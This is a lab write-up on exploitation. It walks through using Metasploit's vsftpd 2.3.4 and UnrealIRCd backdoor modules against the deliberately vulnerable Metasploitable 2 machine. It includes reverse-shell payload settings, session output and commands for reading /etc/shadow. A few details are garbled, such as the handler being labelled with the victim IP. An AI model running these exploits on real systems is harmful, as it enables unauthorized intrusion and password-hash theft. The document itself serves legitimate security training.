# Exploitation
## Concept
In this phase we will explore exploitation. This is the act of taking advantage of a vulnerability (weak point) in the target by using an exploit.\
Have you ever gotten an email from someone claiming to be a Nigerian prince that wants to give you money? Well use that scenario to help better understand the concept of exploitation. The sender of the email would be the attacker, the offer of money would be the exploit, and the vulnerability would be you, more specifically your want for money.

```mermaid
flowchart LR
    A["👤 Attacker<br/>(Nigerian prince)"] -->|sends| E["📧 Exploit<br/>(email offering cash)"]
    E -->|targets| V["👤 Victim<br/>(you)"]
    V -->|"accepts = exposed"| X["⚠️ Vulnerability<br/>(trust, no verification)"]
    X -->|"is exploited by"| P["🎯 Payload<br/>(buy the plane ticket)"]
    P -->|"results in"| I["💸 Impact<br/>(financial loss)"]

    classDef attacker fill:#b71c1c,stroke:#7f0000,stroke-width:2px,color:#fff
    classDef exploit fill:#e65100,stroke:#bf360c,stroke-width:2px,color:#fff
    classDef victim fill:#1f4e79,stroke:#0d2b45,stroke-width:2px,color:#fff
    classDef vuln fill:#f9a825,stroke:#f57f17,stroke-width:3px,color:#000
    classDef payload fill:#4a148c,stroke:#311b92,stroke-width:2px,color:#fff
    classDef impact fill:#37474f,stroke:#263238,stroke-width:2px,color:#fff

    class A attacker
    class E exploit
    class V victim
    class X vuln
    class P payload
    class I impact
```

## Exploiting Our Victim Machine
Metasploitable 2 is an intentional insecure machine. This page will go over some of the vulnerabilities I've discovered and how I've exploited them.

### CVE-2011-2523: vsftpd 2.3.4 Backdoor
#### Description & Information
The service *vsftpd;version 2.3.4* has a vulnerability that allows the attacker to gain full root-level control without a password.
* Severity: Critical
* CVSS Score: 9.8
* Impact: Attackers have full control of affected system. (Data exfiltration, Malware Installation)
#### Execution
I've opted to run the *vsftpd_234_backdoor* exploit through the Metasploit Framework via Kali Linux.
#### Reproduction Steps
1. Open a terminal window on Kali and launch the Metasploit Framework by running `msfconsole`
2. Load the exploit by running `use exploit/unix/ftp/vsftpd_234_backdoor`
3. Set the networking variables, `LHOST` and `RHOST`. This is done by running `set RHOST [Victim Machine IP]` and `set LHOST [Attacker Machine IP]`
4. Run the exploit by running `exploit`
#### Results
```[*] Started reverse TCP handler on [Victim Machine IP:Port] 
[*] [Victim Machine IP:Port] - Running automatic check ("set AutoCheck false" to disable)
[*] [Victim Machine IP:Port] - FTP banner hints its vulnerable: 220 (vsFTPd 2.3.4)
[+] [Victim Machine IP:Port] - The target appears to be vulnerable. vsftpd 2.3.4 banner detected; backdoor may be present
[+] [Victim Machine IP:Port] - Backdoor has been spawned!
[*] Meterpreter session 1 opened ([Attacker Machine IP:Port] -> [Victim Machine IP:Port]) at [Timestamp]
```
#### Debrief
We've successfully infiltrated our victim machine with root priveleges. From here we can exfiltrate sensitive data or install malware. For example we can get password hashes by running `cat /etc/shadow` or view information about local user accounts by running `cat /etc/passwd`.

### CVE-2010-2075: UnreallRCd 3.2.8.1 Backdoor
#### Description 
Certain instances of the service *UnreallRCd;version 3.2.8.1* contains a Trojan Horse which allows attackers to launch remote control execution (RCE) attacks. 
* Severity: Critical
* CVSS Score: 9.8 [CVSS v3]
* Impact: An attacker can run commands on the system-level access of the compromised service.
#### Execution
I've opted to run the *unreal_ircd_3281_backdoor* exploit through the Metasploit Framework via Kali Linux.
#### Reproduction Steps
1. Open a terminal window on Kali and launch the Metasploit Framework by running `msfconsole`
2. Load the exploit by running `use exploit/unix/irc/unreal_ircd_3281_backdoor`
3. Set the networking variables, `LHOST` and `RHOST`. This is done by running `set RHOST [Victim Machine IP]` and `set LHOST [Attacker Machine IP]`
4. Set the payload variable by running `set PAYLOAD cmd/unix/reverse`
5. Run the exploit by running `exploit`